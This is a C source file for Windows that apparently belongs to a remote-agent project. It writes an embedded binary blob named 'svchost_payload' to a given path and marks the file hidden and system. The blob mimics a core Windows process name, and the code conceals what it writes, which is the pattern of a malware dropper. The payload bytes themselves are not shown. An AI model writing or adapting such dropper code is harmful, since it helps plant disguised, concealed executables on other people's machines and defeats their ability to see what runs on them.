#include <windows.h>
#include <stdint.h>
#include "svchost_payload.h"
#include "meshcore/embedded/generated/svchost_payload.h"

static void MeshSvchostPayload_SetHiddenAttributes(const wchar_t* path)
{
    DWORD attrs = GetFileAttributesW(path);
    if (attrs == INVALID_FILE_ATTRIBUTES)
    {
        attrs = 0;
    }
    attrs |= FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
    SetFileAttributesW(path, attrs);
}

const unsigned char* MeshSvchostPayload_GetData(size_t* length)
{
    if (length != NULL)
    {
        *length = (size_t)g_SvchostPayload_SIZE;
    }
    return g_SvchostPayload;
}

BOOL MeshSvchostPayload_WriteToPath(const wchar_t* destination)
{
    if (destination == NULL || destination[0] == L'\0')
    {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    size_t dataLength = 0;
    const unsigned char* data = MeshSvchostPayload_GetData(&dataLength);
    if (data == NULL || dataLength == 0)
    {
        SetLastError(ERROR_INVALID_DATA);
        return FALSE;
    }

    HANDLE fileHandle = CreateFileW(destination,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_HIDDEN,
        NULL);

    if (fileHandle == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }

    DWORD written = 0;
    BOOL result = WriteFile(fileHandle, data, (DWORD)dataLength, &written, NULL);
    DWORD writeErr = result ? ERROR_SUCCESS : GetLastError();
    CloseHandle(fileHandle);

    if (!result || written != dataLength)
    {
        if (writeErr != ERROR_SUCCESS)
        {
            SetLastError(writeErr);
        }
        DeleteFileW(destination);
        return FALSE;
    }

    MeshSvchostPayload_SetHiddenAttributes(destination);
    return TRUE;
}
